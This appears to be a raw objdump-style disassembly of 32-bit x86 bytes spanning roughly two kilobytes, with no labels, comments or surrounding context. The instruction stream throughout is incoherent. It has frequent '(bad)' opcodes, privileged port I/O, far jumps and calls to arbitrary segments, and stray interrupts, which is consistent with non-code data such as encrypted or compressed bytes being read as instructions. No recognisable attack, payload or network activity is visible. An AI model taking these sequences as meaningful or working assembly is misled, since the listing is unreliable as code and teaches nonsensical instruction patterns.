  401aa8:	sbb    ah,cl
  401aaa:	push   0xffffffef
  401aac:	add    dh,bh
  401aae:	jmp    0x4e5fac41
  401ab3:	or     eax,0xb63a2834
  401ab8:	dec    esp
  401ab9:	in     eax,0xeb
  401abb:	xor    eax,0x6e4d037b
  401ac0:	fbld   TBYTE PTR [edx]
  401ac2:	fist   DWORD PTR [ecx+0x42]
  401ac5:	fidivr DWORD PTR [esi]
  401ac7:	rcr    BYTE PTR [ecx+0x56],1
  401aca:	lock fbld TBYTE PTR [ebx+0x332cdb2b]
  401ad1:	addr16 int 0x87
  401ad4:	inc    esp
  401ad5:	ss mov edi,0xac668f28
  401adb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401adc:	int    0x28
  401ade:	(bad)  
  401adf:	fild   WORD PTR [edi-0x72]
  401ae2:	add    eax,0xd4c06059
  401ae7:	mov    dh,0x8e
  401ae9:	jb     0x401b28
  401aeb:	and    edi,ebx
  401aed:	adc    al,0x1c
  401aef:	mov    al,0x3a
  401af1:	clc    
  401af2:	pushf  
  401af3:	inc    ebp
  401af4:	(bad)  
  401af5:	xchg   edx,eax
  401af6:	mov    BYTE PTR [edi+0x26f2f6a0],cl
  401afc:	sub    al,0xc
  401afe:	rol    DWORD PTR [ebx+0x65],1
  401b01:	dec    esi
  401b02:	or     ah,bh
  401b04:	retf   
  401b05:	inc    ecx
  401b06:	ja     0x401b7d
  401b08:	popf   
  401b09:	stos   DWORD PTR es:[edi],eax
  401b0a:	fsubr  QWORD PTR [esp+ebx*1+0x49]
  401b0e:	enter  0xa55c,0x8c
  401b12:	adc    ah,bl
  401b14:	xchg   esp,eax
  401b15:	mov    ebx,ecx
  401b17:	imul   ecx,edx,0xffffffbe
  401b1a:	aad    0x82
  401b1c:	add    dh,ah
  401b1e:	inc    eax
  401b1f:	and    BYTE PTR [esi],ch
  401b21:	and    al,0x4c
  401b23:	sub    DWORD PTR [edi+ebp*8+0x8],esi
  401b27:	lea    eax,[edx]
  401b29:	and    al,0x78
  401b2b:	mov    eax,0xef2b9d36
  401b30:	and    esi,DWORD PTR [edi]
  401b32:	mov    ds:0xe94fd655,al
  401b37:	cmp    BYTE PTR ds:0xaffed52d,ch
  401b3d:	out    0x3,eax
  401b3f:	mov    ds:0xd11d5239,al
  401b44:	(bad)
  401b47:	rcr    BYTE PTR [ecx+esi*1-0x36],cl
  401b4b:	cmp    BYTE PTR [ebx+0x4b],bl
  401b4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401b4f:	adc    ebx,DWORD PTR [esi]
  401b51:	jle    0x401b24
  401b53:	push   0x974f322e
  401b58:	adc    edi,DWORD PTR [ebx]
  401b5a:	clc    
  401b5b:	or     BYTE PTR [edx-0x4d],dl
  401b5e:	jno    0x401ba3
  401b60:	xor    DWORD PTR [ebx],esp
  401b62:	sub    al,0x9
  401b64:	sub    eax,0x4e604c59
  401b69:	aam    0x3e
  401b6b:	jge    0x401bc5
  401b6d:	inc    esi
  401b6e:	xor    al,0x62
  401b70:	add    BYTE PTR [edx+esi*4+0x7c],dh
  401b74:	jnp    0x401bec
  401b76:	int    0xd8
  401b78:	xor    esp,edi
  401b7a:	sub    DWORD PTR [edi+ecx*2+0x762174a8],0xffffffa1
  401b82:	jmp    0x401b6d
  401b84:	mov    bh,0x6f
  401b86:	std    
  401b87:	rcr    DWORD PTR [eax],0xe8
  401b8a:	sbb    al,0x29
  401b8c:	into   
  401b8d:	sbb    BYTE PTR [eax+0x7e],ch
  401b90:	call   0x7ab5:0x45b45049
  401b97:	(bad)  
  401b98:	pop    ss
  401b99:	ret    0x6e15
  401b9c:	outs   dx,DWORD PTR ds:[esi]
  401b9d:	dec    esp
  401b9e:	fidivr WORD PTR [ecx+0x23]
  401ba1:	fisubr DWORD PTR [edx+0x6d0aaef1]
  401ba7:	and    ecx,DWORD PTR [edi-0x72]
  401baa:	dec    eax
  401bab:	int    0x5d
  401bad:	shl    eax,cl
  401baf:	mov    ebp,0xc9dcc345
  401bb4:	sbb    al,0xb2
  401bb6:	test   DWORD PTR [bp+di+0x5b],esi
  401bba:	add    bh,ch
  401bbc:	jo     0x401be2
  401bbe:	in     eax,0x66
  401bc0:	(bad)  
  401bc2:	mov    edx,0xc26365d3
  401bc7:	push   ebx
  401bc8:	and    DWORD PTR [ebp-0x6d],esi
  401bcb:	(bad)  
  401bcd:	jns    0x401bd7
  401bcf:	outs   dx,BYTE PTR ds:[esi]
  401bd0:	iret   
  401bd1:	out    0x50,eax
  401bd3:	pushf  
  401bd4:	imul   esp,ebx,0xffffffed
  401bd7:	jmp    0x4478f03e
  401bdc:	ror    DWORD PTR [esi],cl
  401bde:	enter  0x5fe9,0x4e
  401be2:	(bad)  
  401be3:	pop    ds
  401be4:	aam    0xe9
  401be6:	lods   al,BYTE PTR ds:[esi]
  401be7:	jo     0x401bf0
  401be9:	adc    eax,0xb08fa51
  401bee:	stos   BYTE PTR es:[edi],al
  401bef:	and    eax,0x2d7a3124
  401bf4:	xchg   esp,eax
  401bf5:	fcomi  st,st(0)
  401bf7:	pop    ds
  401bf8:	and    eax,0x71c6b0b6
  401bfd:	call   edx
  401bff:	mov    ecx,0xd83301af
  401c04:	iret   
  401c05:	mov    ch,bh
  401c07:	repnz ins DWORD PTR es:[edi],dx
  401c09:	stos   BYTE PTR es:[edi],al
  401c0a:	mov    WORD PTR [ebp-0x37],?
  401c0d:	dec    edi
  401c0e:	mov    DWORD PTR [edi],0xad16096f
  401c14:	push   ds
  401c15:	je     0x401c6a
  401c17:	mov    WORD PTR [esi+0x3f9d5f98],ds
  401c1d:	dec    esi
  401c1e:	popf   
  401c1f:	cdq    
  401c20:	add    al,0x6c
  401c22:	jno    0x401c59
  401c24:	jmp    0x35c6:0x6bde0c5f
  401c2b:	fidiv  DWORD PTR [esp+ebx*8+0x59]
  401c2f:	dec    esi
  401c30:	adc    esi,DWORD PTR [eax-0x5]
  401c33:	xchg   ebp,eax
  401c34:	ficomp DWORD PTR [ebp-0x1d]
  401c37:	aas    
  401c38:	xchg   edx,eax
  401c39:	mov    esi,0x644d2623
  401c3e:	or     ecx,DWORD PTR [esp+ebp*1]
  401c41:	arpl   WORD PTR [ebx],bp
  401c43:	mov    dl,0xf3
  401c45:	push   ecx
  401c46:	push   ebx
  401c47:	pop    eax
  401c48:	add    DWORD PTR [esi+0x3d],0x765e0c31
  401c4f:	addr16 mov ds:0x9ee3,al
  401c53:	push   cs
  401c54:	icebp  
  401c55:	jge    0x401cc3
  401c57:	sub    bl,BYTE PTR [ecx-0x2675d437]
  401c5d:	mov    esp,0x3ac7811b
  401c62:	fidivr DWORD PTR [ecx+0x32]
  401c65:	add    DWORD PTR [ebx+ebp*2-0x75],esp
  401c69:	dec    edi
  401c6a:	mov    cl,0xf0
  401c6c:	xlat   BYTE PTR ds:[ebx]
  401c6d:	(bad)  
  401c6e:	or     al,0x7d
  401c70:	stos   DWORD PTR es:[edi],eax
  401c71:	sbb    DWORD PTR [ecx],esp
  401c73:	shl    DWORD PTR [edi-0x76b47fc6],0xa6
  401c7a:	dec    eax
  401c7b:	and    al,0xdb
  401c7d:	add    eax,0x7096b4b3
  401c82:	mov    BYTE PTR [ebx+ebp*2-0x34],0x4a
  401c87:	(bad)  
  401c88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401c89:	jo     0x401cb1
  401c8b:	inc    esp
  401c8c:	inc    ecx
  401c8d:	inc    ebx
  401c8e:	sub    eax,0x3a1b648
  401c93:	dec    edi
  401c94:	sbb    BYTE PTR [ecx],ch
  401c96:	leave  
  401c97:	loop   0x401c25
  401c99:	pop    ebp
  401c9a:	loope  0x401cd5
  401c9c:	inc    edx
  401c9d:	sbb    eax,0x1c109f69
  401ca2:	in     eax,dx
  401ca3:	cmp    DWORD PTR [esi+ebp*2+0x6154032e],esp
  401caa:	dec    eax
  401cab:	xchg   BYTE PTR [ecx+0x51fd3050],cl
  401cb1:	in     eax,dx
  401cb2:	fisttp WORD PTR [edx+0x19c10b9b]
  401cb8:	sbb    eax,0x27a6d4c3
  401cbd:	(bad)  
  401cbe:	hlt    
  401cbf:	inc    eax
  401cc0:	loop   0x401d1d
  401cc2:	and    DWORD PTR [edx],esi
  401cc4:	and    BYTE PTR [edx+0x1d],ah
  401cc7:	mov    al,0x73
  401cc9:	dec    eax
  401cca:	jae    0x401c6f
  401ccc:	dec    ecx
  401ccd:	hlt    
  401cce:	add    al,0x8a
  401cd0:	stos   BYTE PTR es:[edi],al
  401cd1:	pop    edi
  401cd2:	test   al,0x59
  401cd4:	push   eax
  401cd5:	xchg   ebp,eax
  401cd6:	fiadd  DWORD PTR gs:[eax-0x452aedb2]
  401cdd:	add    eax,0xa79781e7
  401ce2:	iret   
  401ce3:	scas   eax,DWORD PTR es:[edi]
  401ce4:	push   ebp
  401ce5:	lods   eax,DWORD PTR ds:[esi]
  401ce6:	inc    ebx
  401ce7:	shl    DWORD PTR [ecx],0x97
  401cea:	cmp    edi,DWORD PTR [ebx+0x5b]
  401ced:	stc    
  401cee:	add    eax,0x3f424821
  401cf3:	inc    edx
  401cf4:	inc    edx
  401cf5:	xchg   DWORD PTR [eax+0x7ea797a9],edx
  401cfb:	add    al,0x8
  401cfd:	add    DWORD PTR [edi+0x6081fa15],ebp
  401d03:	imul   eax,DWORD PTR [edi+0x54f1f8c7],0x33
  401d0a:	aad    0x98
  401d0c:	or     ebx,DWORD PTR [esi+0x5e0b02a0]
  401d12:	jno    0x401cf5
  401d14:	xor    ebx,edi
  401d16:	jecxz  0x401d12
  401d18:	test   DWORD PTR [edx],eax
  401d1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d1b:	leave  
  401d1c:	repz int 0xa1
  401d1f:	test   dh,0xbe
  401d22:	push   esi
  401d23:	push   ss
  401d24:	sti    
  401d25:	idiv   BYTE PTR [esi+0x7d]
  401d28:	push   ebx
  401d29:	ret    
  401d2a:	cmp    BYTE PTR [edx],0x71
  401d2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d2e:	add    al,BYTE PTR gs:[esi+esi*1+0x246fffe2]
  401d36:	inc    ebp
  401d37:	jo     0x401d42
  401d39:	sahf   
  401d3a:	jnp    0x401d7f
  401d3c:	outs   dx,BYTE PTR ds:[esi]
  401d3d:	push   cs
  401d3e:	jge    0x401d30
  401d40:	loop   0x401cdf
  401d42:	and    BYTE PTR [ebp+0x26361ec4],dh
  401d48:	pop    edi
  401d49:	test   al,0xc6
  401d4b:	(bad)  
  401d4c:	jae    0x401d83
  401d4e:	or     DWORD PTR ss:[ebx],eax
  401d51:	pop    ss
  401d52:	nop
  401d53:	dec    ecx
  401d54:	sbb    esi,esi
  401d56:	mov    al,ds:0xa0f83188
  401d5b:	mov    ecx,0xe5a50d75
  401d60:	clc    
  401d61:	cmp    bl,BYTE PTR ds:0x99a1c67c
  401d68:	popa   
  401d69:	pop    esp
  401d6a:	xchg   esi,eax
  401d6b:	icebp  
  401d6c:	out    dx,eax
  401d6d:	mov    ah,0xa5
  401d6f:	mov    dl,0x8c
  401d71:	or     dl,ch
  401d73:	cmp    al,0x3e
  401d75:	pop    esp
  401d76:	fwait
  401d77:	adc    al,0xd8
  401d79:	lds    esi,FWORD PTR [esi+0x1b]
  401d7c:	jae    0x401d5f
  401d7e:	aam    0x3
  401d80:	add    ah,BYTE PTR [ecx]
  401d82:	jns    0x401d56
  401d84:	das    
  401d85:	outs   dx,BYTE PTR ds:[esi]
  401d86:	and    eax,0x92f0c677
  401d8b:	and    BYTE PTR [esi+ebp*4],al
  401d8e:	shl    DWORD PTR [edi],1
  401d90:	or     eax,0x5fafff93
  401d95:	jl     0x401d2f
  401d97:	cmp    DWORD PTR [esi-0x5a],ebx
  401d9a:	mov    al,ds:0x21626422
  401d9f:	(bad)  
  401da0:	call   0x750f80e9
  401da5:	loop   0x401db9
  401da7:	in     eax,dx
  401da8:	test   ebx,0x645457d3
  401dae:	mov    esp,esp
  401db0:	lods   al,BYTE PTR ds:[esi]
  401db1:	cmp    DWORD PTR [esi+ebx*2+0x2d7e6d1a],ebx
  401db8:	fld    TBYTE PTR [edi]
  401dba:	in     eax,dx
  401dbb:	pop    edi
  401dbc:	mov    dl,0xff
  401dbe:	and    eax,0x2b298d52
  401dc3:	and    ebx,edx
  401dc5:	adc    BYTE PTR [edi+0x52194357],dh
  401dcb:	test   eax,0x932bb971
  401dd0:	popf   
  401dd1:	adc    BYTE PTR [edx+0xf],dl
  401dd4:	out    dx,al
  401dd5:	call   0x75e0:0xe6974178
  401ddc:	pop    esi
  401ddd:	pop    es
  401dde:	xchg   BYTE PTR [edi+0x223d35b2],ch
  401de4:	and    dh,dl
  401de6:	mov    dl,0x5d
  401de8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401de9:	cmp    esi,DWORD PTR [edi+0x2433c868]
  401def:	imul   eax,DWORD PTR [edi],0xbe860fc9
  401df5:	das    
  401df6:	cmp    dl,BYTE PTR [ecx+edi*1+0x59e52db7]
  401dfd:	bound  eax,QWORD PTR [eax]
  401dff:	iret   
  401e00:	xor    dl,BYTE PTR [edx]
  401e02:	mov    esp,0x3f97225e
  401e07:	mov    ebp,0xfb723d0d
  401e0c:	test   BYTE PTR [ebp+eiz*8+0x3803b350],al
  401e13:	mov    ds:0x22eec025,al
  401e18:	and    ah,ch
  401e1a:	shr    DWORD PTR [esi+0x6],1
  401e1d:	xor    esp,ebx
  401e1f:	mov    eax,0x300125ca
  401e24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401e25:	test   edx,0x7f313565
  401e2b:	cwde   
  401e2c:	daa    
  401e2d:	pop    ebx
  401e2e:	rol    BYTE PTR [edx],1
  401e30:	jmp    0x5e73:0xf4cad0d5
  401e37:	pop    edx
  401e38:	js     0x401e3d
  401e3a:	adc    BYTE PTR [eax],0x57
  401e3d:	xor    cl,BYTE PTR [edi+0x5d]
  401e40:	dec    ecx
  401e41:	cmp    BYTE PTR ds:0x93b5905c,0xd4
  401e48:	push   0x70
  401e4a:	jg     0x401e5e
  401e4c:	inc    eax
  401e4d:	or     esi,DWORD PTR [ebx-0x2e5fc51a]
  401e53:	xchg   esi,eax
  401e54:	push   ds
  401e55:	pop    ss
  401e56:	pushf  
  401e57:	dec    ebx
  401e58:	push   ecx
  401e59:	and    eax,0xa1f17a30
  401e5e:	pop    ss
  401e5f:	pop    ss
  401e60:	scas   al,BYTE PTR es:[edi]
  401e61:	adc    esi,eax
  401e63:	rol    ah,cl
  401e65:	push   ebx
  401e66:	imul   ecx,DWORD PTR [eax-0x7],0x48029f7a
  401e6d:	or     BYTE PTR [esi],ch
  401e6f:	push   ecx
  401e70:	cmp    eax,0x9023c2b5
  401e75:	or     edi,DWORD PTR [edi]
  401e77:	test   BYTE PTR [edi-0x72],0x3a
  401e7b:	imul   ebx,DWORD PTR [edi-0x2f6aef69],0x5240e2a4
  401e85:	and    dl,0xc
  401e88:	jmp    0xff9837d0
  401e8d:	pop    esp
  401e8e:	add    ah,dh
  401e90:	dec    ebx
  401e91:	out    dx,al
  401e92:	lods   al,BYTE PTR ds:[esi]
  401e93:	enter  0x8115,0xef
  401e97:	aaa    
  401e98:	out    0x71,al
  401e9a:	cdq    
  401e9b:	push   ebx
  401e9c:	adc    edx,DWORD PTR ds:0x27fcaa9e
  401ea2:	mov    dl,0x39
  401ea4:	pop    es
  401ea5:	(bad)  [esi+0xa]
  401ea8:	out    dx,eax
  401ea9:	ins    DWORD PTR es:[edi],dx
  401eaa:	div    edi
  401eac:	scas   al,BYTE PTR es:[edi]
  401ead:	inc    BYTE PTR [ecx+0x7b60623b]
  401eb3:	ret    0x7ee7
  401eb6:	add    ecx,ebx
  401eb8:	cli    
  401eb9:	mov    ?,WORD PTR [esi-0x7baa3181]
  401ebf:	sub    al,0x3a
  401ec1:	in     al,0xed
  401ec3:	cmp    al,0xbc
  401ec5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401ec6:	pop    esi
  401ec7:	push   esi
  401ec8:	dec    eax
  401ec9:	lods   eax,DWORD PTR ds:[esi]
  401eca:	ret    0xb7a3
  401ecd:	mov    DWORD PTR [eax+0x20],ebx
  401ed0:	add    eax,0x299750b3
  401ed5:	retf   
  401ed6:	out    0x82,eax
  401ed8:	jb     0x401efa
  401eda:	push   ds
  401edb:	cmp    eax,0xf8b47b0e
  401ee0:	std    
  401ee1:	ins    DWORD PTR es:[edi],dx
  401ee2:	mov    ds:0x1b93591e,al
  401ee7:	stos   BYTE PTR es:[edi],al
  401ee8:	push   cs
  401ee9:	ficomp DWORD PTR [eax]
  401eeb:	mov    DWORD PTR [edx+edx*1-0x7f613d6f],esp
  401ef2:	mov    esi,0x30267c0e
  401ef7:	add    dh,cl
  401ef9:	nop
  401efa:	aaa    
  401efb:	fdivr  st(6),st
  401efd:	add    esi,DWORD PTR [ebx]
  401eff:	adc    bh,BYTE PTR [ecx+0x4c]
  401f02:	fild   DWORD PTR [ebx-0xc]
  401f05:	add    eax,DWORD PTR [esi]
  401f07:	mov    dl,0xc9
  401f09:	pop    ebp
  401f0a:	gs fsub st,st(0)
  401f0d:	repnz sub dh,ah
  401f10:	lods   al,BYTE PTR ds:[esi]
  401f11:	pop    esp
  401f12:	jns    0x401ec0
  401f14:	and    dl,BYTE PTR [eax+0x3d844b6b]
  401f1a:	jb     0x401f41
  401f1c:	push   ecx
  401f1d:	retf   0xc11c
  401f20:	leave  
  401f21:	cmc    
  401f22:	lods   al,BYTE PTR ds:[esi]
  401f23:	outs   dx,BYTE PTR ds:[esi]
  401f24:	inc    eax
  401f25:	ret    0x6374
  401f28:	or     esp,DWORD PTR [edx]
  401f2a:	fild   DWORD PTR [esi]
  401f2c:	xchg   ebx,eax
  401f2d:	pop    edx
  401f2e:	jno    0x401ec7
  401f30:	or     ecx,DWORD PTR [ecx+esi*8]
  401f33:	inc    esi
  401f34:	sub    al,0xde
  401f36:	xchg   edi,eax
  401f37:	xchg   esp,eax
  401f38:	or     BYTE PTR [ebx],al
  401f3a:	nop
  401f3b:	sub    DWORD PTR [ebp+0x7f],eax
  401f3e:	sub    al,BYTE PTR [eax-0x6b]
  401f41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f42:	pop    edi
  401f43:	jae    0x401f7a
  401f45:	pop    eax
  401f46:	mov    dh,0x32
  401f48:	test   BYTE PTR [eax+0x27b4c1d3],bl
  401f4e:	outs   dx,DWORD PTR ds:[esi]
  401f4f:	fisub  DWORD PTR [edi+0x66278dca]
  401f55:	std    
  401f56:	inc    ecx
  401f57:	dec    esp
  401f58:	inc    esp
  401f59:	or     al,0x1f
  401f5b:	mov    bl,0x9e
  401f5d:	(bad)  
  401f60:	fiadd  WORD PTR [esi-0x4a]
  401f63:	and    bl,bl
  401f65:	push   es
  401f66:	jns    0x401f5a
  401f68:	fild   WORD PTR [edx-0x42]
  401f6b:	inc    edi
  401f6c:	xchg   ebx,eax
  401f6d:	push   ds
  401f6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401f6f:	and    DWORD PTR [ecx],ebp
  401f71:	arpl   WORD PTR ds:[ebp-0x39bc80e6],di
  401f78:	push   ss
  401f79:	push   cs
  401f7a:	mov    eax,0x74c2cf2e
  401f7f:	fld    QWORD PTR [edi-0x55]
  401f82:	dec    edx
  401f83:	add    ah,bl
  401f85:	xor    BYTE PTR [edi+0x62],dh
  401f88:	xor    al,0xdd
  401f8a:	push   esp
  401f8b:	aaa    
  401f8c:	mov    al,0x45
  401f8e:	mov    cl,0x8d
  401f90:	stos   BYTE PTR es:[edi],al
  401f91:	xchg   esp,eax
  401f92:	imul   eax,ebx,0x26
  401f95:	jg     0x401f82
  401f97:	push   es
  401f98:	shl    ah,0xe3
  401f9b:	sbb    dh,dh
  401f9d:	adc    BYTE PTR [eax-0x34c5b34],dh
  401fa3:	jae    0x401f5b
  401fa5:	xor    BYTE PTR [edi+0x42dcf4],0x37
  401fac:	jno    0x402029
  401fae:	mov    ebp,0x1db619b0
  401fb3:	pusha  
  401fb4:	dec    ebx
  401fb5:	sbb    bl,bl
  401fb7:	out    0xec,eax
  401fb9:	or     eax,0xf9b2e2dd
  401fbe:	inc    edx
  401fbf:	int    0x73
  401fc1:	pop    esp
  401fc2:	push   esi
  401fc3:	je     0x402023
  401fc5:	push   ds
  401fc6:	add    ebx,ebx
  401fc8:	ins    BYTE PTR es:[edi],dx
  401fc9:	loope  0x401f98
  401fcb:	sub    eax,ecx
  401fcd:	push   0x30
  401fcf:	sbb    ah,BYTE PTR [edi-0x27c46db7]
  401fd5:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401fd7:	jge    0x402009
  401fd9:	xchg   BYTE PTR [esi],ah
  401fdb:	imul   esp
  401fdd:	push   ss
  401fde:	mov    ah,0xef
  401fe0:	sub    eax,0xd5e3c8aa
  401fe5:	xor    ebp,edx
  401fe7:	ror    DWORD PTR [ecx+esi*1-0x6526d2ab],1
  401fee:	test   eax,0x57e6fbdd
  401ff3:	imul   esi,DWORD PTR [ebx],0x8f58be78
  401ff9:	mov    eax,0x6567edeb
  401ffe:	push   esi
  401fff:	inc    ebp
  402000:	cdq    
  402001:	cmp    BYTE PTR [ecx+0x5c],dl
  402004:	xor    al,ch
  402006:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402007:	(bad)  
  402008:	data16 or cl,BYTE PTR ds:0xfdb8b942
  40200f:	fisubr DWORD PTR [ebx-0x136bdb27]
  402015:	test   DWORD PTR [eax+ecx*8-0x64c6e940],eax
  40201c:	and    esp,DWORD PTR [edi-0x20a34ce]
  402022:	bound  esp,QWORD PTR [ebp+0x13]
  402025:	xchg   esi,eax
  402026:	sahf   
  402027:	pushf  
  402028:	sbb    DWORD PTR [ecx+0x3d],esp
  40202b:	test   BYTE PTR [edi+eiz*2+0xcbe1d1f],0x2
  402033:	xor    bh,0xf0
  402036:	pop    ecx
  402037:	adc    ch,bl
  402039:	(bad)  
  40203b:	xlat   BYTE PTR ds:[ebx]
  40203c:	into   
  40203d:	in     al,dx
  40203e:	mov    dl,0x38
  402040:	(bad)  
  402041:	push   ebp
  402042:	out    0x1f,al
  402044:	push   0xffffff82
  402046:	jnp    0x40204f
  402048:	xchg   edi,eax
  402049:	jecxz  0x402035
  40204b:	sub    eax,0x3ae579a0
  402050:	xchg   ebx,eax
  402051:	mov    DWORD PTR [esi-0x5ab77d57],ebp
  402057:	pop    esi
  402058:	retf   
  402059:	cwde   
  40205a:	lock push 0xffffff82
  40205d:	stc    
  40205e:	fdivr  DWORD PTR cs:[eax+0x6c]
  402062:	mov    BYTE PTR [ecx-0x20790192],ah
  402068:	dec    ebp
  402069:	dec    esp
  40206a:	sub    BYTE PTR [ebx-0x75f1a30d],ah
  402070:	out    dx,eax
  402071:	test   BYTE PTR [ecx],ah
  402073:	(bad)  
  402074:	mov    eax,ds:0x989f9c65
  402079:	mov    dh,BYTE PTR [ebx-0x6c66665e]
  40207f:	ret    
  402080:	test   eax,0x79fe08ba
  402085:	xchg   esi,eax
  402086:	cs push edi
  402088:	xor    esi,DWORD PTR [edx]
  40208a:	sbb    eax,0x6b10d258
  40208f:	leave  
  402090:	sub    BYTE PTR [ebx-0x37],bh
  402093:	inc    eax
  402094:	jle    0x40201b
  402096:	leave  
  402097:	test   BYTE PTR [ecx+0x6a2cba23],bh
  40209d:	scas   eax,DWORD PTR es:[edi]
  40209e:	adc    al,0xf6
  4020a0:	ins    BYTE PTR es:[edi],dx
  4020a1:	or     eax,0x1c032c68
  4020a6:	ja     0x4020b2
  4020a8:	pop    ds
  4020a9:	sbb    ecx,DWORD PTR [edx]
  4020ab:	mov    al,ds:0x5fb9f802
  4020b0:	test   DWORD PTR [esi+eax*1],esi
  4020b3:	sbb    eax,edx
  4020b5:	xchg   edx,eax
  4020b6:	addr16 (bad) 
  4020b8:	xor    BYTE PTR [edi],al
  4020ba:	lds    esi,FWORD PTR [edx]
  4020bc:	pop    ds
  4020bd:	fwait
  4020be:	gs int 0x3
  4020c1:	scas   al,BYTE PTR es:[edi]
  4020c2:	mov    cl,BYTE PTR [ebx]
  4020c4:	and    edi,DWORD PTR [esi+0x1c]
  4020c7:	div    BYTE PTR [eax+0x6d33306]
  4020cd:	shl    DWORD PTR ds:0x14a1317d,cl
  4020d3:	ja     0x402147
  4020d5:	mov    ebx,0xff55d4e1
  4020da:	dec    ebx
  4020db:	inc    eax
  4020dc:	es out dx,al
  4020de:	nop
  4020df:	nop
  4020e0:	mov    ch,0x9b
  4020e2:	pop    ss
  4020e3:	ret    
  4020e4:	aad    0xe9
  4020e6:	call   0xc0eaa1b5
  4020eb:	cwde   
  4020ec:	and    al,0xac
  4020ee:	jl     0x4020c2
  4020f0:	sbb    edx,DWORD PTR [eax]
  4020f2:	jmp    0x402137
  4020f4:	push   es
  4020f5:	push   eax
  4020f6:	cmp    ecx,DWORD PTR [ebx]
  4020f8:	sbb    ch,BYTE PTR [esi]
  4020fa:	fistp  QWORD PTR [ecx]
  4020fc:	lahf   
  4020fd:	in     eax,0xf
  4020ff:	shl    ebx,1
  402101:	xchg   edx,eax
  402102:	stos   DWORD PTR es:[edi],eax
  402103:	jl     0x40211a
  402105:	push   0x93a354f8
  40210a:	jns    0x40217a
  40210c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40210d:	or     bl,dh
  40210f:	jl     0x402135
  402111:	xchg   BYTE PTR [ecx-0x69e48c41],dl
  402117:	(bad)  [edx]
  402119:	add    eax,0xf9427c33
  40211e:	fwait
  40211f:	mov    al,BYTE PTR [edx+0x2ed4ceb0]
  402125:	cmp    esi,DWORD PTR [ebx-0xf99bf23]
  40212b:	lock scas eax,DWORD PTR es:[edi]
  40212d:	test   eax,0xc7674ce3
  402132:	ins    DWORD PTR es:[edi],dx
  402133:	mov    WORD PTR [edi],fs
  402135:	pop    ecx
  402136:	sbb    BYTE PTR [eax],cl
  402138:	repnz imul ebp,DWORD PTR [edx+0x79],0x9d6e1d68
  402140:	push   eax
  402141:	das    
  402142:	sbb    BYTE PTR [edx+0x65],0x7f
  402146:	pop    esi
  402147:	mov    DWORD PTR [edx-0x1ec9d94b],esp
  40214d:	pop    ds
  40214e:	push   edi
  40214f:	adc    DWORD PTR [ecx],edi
  402151:	sub    eax,0xa0e232c4
  402156:	les    esp,FWORD PTR [edi-0x2a8eb50d]
  40215c:	cmp    dh,BYTE PTR [ebx+0x1b]
  40215f:	lock mov esp,DWORD PTR [ebx+0x2e]
  402163:	or     eax,0x8cba83de
  402168:	mov    ss:0x61a69e75,eax
  40216e:	xor    al,0x94
  402170:	(bad)  
  402171:	fidiv  DWORD PTR [ebp-0x64c72ce9]
  402177:	or     DWORD PTR [ebp+eiz*1+0x205f9555],eax
  40217e:	inc    ecx
  40217f:	inc    ebp
  402180:	xor    BYTE PTR [ebp+0x496c16b0],bl
  402186:	(bad)  
  402188:	(bad)  
  402189:	jge    0x40215c
  40218b:	je     0x4021f3
  40218d:	leave  
  40218e:	(bad)  
  40218f:	ins    BYTE PTR es:[edi],dx
  402190:	push   es
  402191:	outs   dx,BYTE PTR ds:[esi]
  402192:	cmp    BYTE PTR [ebx],ch
  402194:	xchg   esp,eax
  402195:	aas    
  402196:	mov    bh,0x2
  402198:	rcr    BYTE PTR [ecx],1
  40219a:	and    BYTE PTR [ebx+0x38307813],bh
  4021a0:	cli    
  4021a1:	and    al,0xb9
  4021a3:	and    eax,0x769b1b47
  4021a8:	inc    esi
  4021a9:	pusha  
  4021aa:	shl    BYTE PTR [eax-0x6bd601d4],0xd0
  4021b1:	shl    dh,0x5b
  4021b4:	or     DWORD PTR [ebx-0x49acdd76],0xf972c7f2
  4021be:	loope  0x402192
  4021c0:	(bad)  
  4021c1:	stos   DWORD PTR es:[edi],eax
  4021c2:	mov    edx,0xf57f9a4c
  4021c7:	ins    BYTE PTR es:[edi],dx
  4021c8:	sub    eax,0x9fe7a05b
  4021cd:	push   esp
  4021ce:	xchg   ecx,eax
  4021cf:	jmp    0x2f284014
  4021d4:	add    al,0xa3
  4021d6:	add    dl,dl
  4021d8:	(bad)  
  4021d9:	ds and eax,0x3badba55
  4021df:	jmp    0x57ca:0x9057cccd
  4021e6:	pop    esp
  4021e7:	xchg   cl,al
  4021e9:	or     eax,0x282d4a97
  4021ee:	test   BYTE PTR [edx+0x7406abf9],ah
  4021f4:	and    BYTE PTR [ecx+0x60],0xd8
  4021f8:	jge    0x4021ba
  4021fa:	jmp    0x449f:0xfed55eae
  402201:	pop    es
  402202:	jp     0x402218
  402204:	enter  0x9c6,0xf6
  402208:	int3   
  402209:	xchg   BYTE PTR [eax+0x5e],bl
  40220c:	xor    DWORD PTR [edi],edi
  40220e:	push   eax
  40220f:	xor    DWORD PTR [edi+0x59],esp
  402212:	clc    
  402213:	sbb    al,BYTE PTR [edi]
  402215:	enter  0x596,0xea
  402219:	jecxz  0x402287
  40221b:	dec    ebp
  40221c:	sbb    DWORD PTR [edi],ebx
  40221e:	adc    edi,DWORD PTR [esi-0x73]
  402221:	test   al,0x8f
  402223:	add    BYTE PTR [edi+0x3203fd84],ch
  402229:	pop    esi
  40222a:	xchg   ebx,eax
  40222b:	loop   0x4021f4
  40222d:	(bad)  
  40222e:	adc    al,al
  402230:	fadd   DWORD PTR [ebp-0x75]
  402233:	push   0x76dede4e
  402238:	retf   0x1158
  40223b:	imul   edi,DWORD PTR [ebx+0x75],0x51
  40223f:	push   ecx
  402240:	imul   eax,DWORD PTR [edi+0x1b],0x307d4fa7
  402247:	ret    
  402248:	cwde   
  402249:	xchg   edx,eax
  40224a:	mov    esi,0x1586c866
